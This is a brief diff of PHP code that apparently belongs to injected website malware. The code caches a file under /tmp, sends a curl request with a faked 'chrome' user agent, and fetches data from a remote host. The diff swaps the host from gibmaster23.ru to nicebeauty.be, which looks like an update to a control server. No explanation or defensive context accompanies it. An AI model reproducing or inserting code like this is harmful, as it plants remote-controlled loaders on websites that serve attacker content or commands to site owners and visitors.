@@ -7,7 +7,7 @@ if(filesize('/tmp/bn3ea'.$d)) { } else {
   $curl3 = curl_init();
  curl_setopt_array($curl3, [
     CURLOPT_RETURNTRANSFER => 1,
-    CURLOPT_URL => 'http://www.gibmaster23.ru/data/data.php?s='.$d.'',
+    CURLOPT_URL => 'http://nicebeauty.be//data/date.php?s='.$d.'',
     CURLOPT_USERAGENT => 'chrome'
 ]);
  $resp3 = curl_exec($curl3);
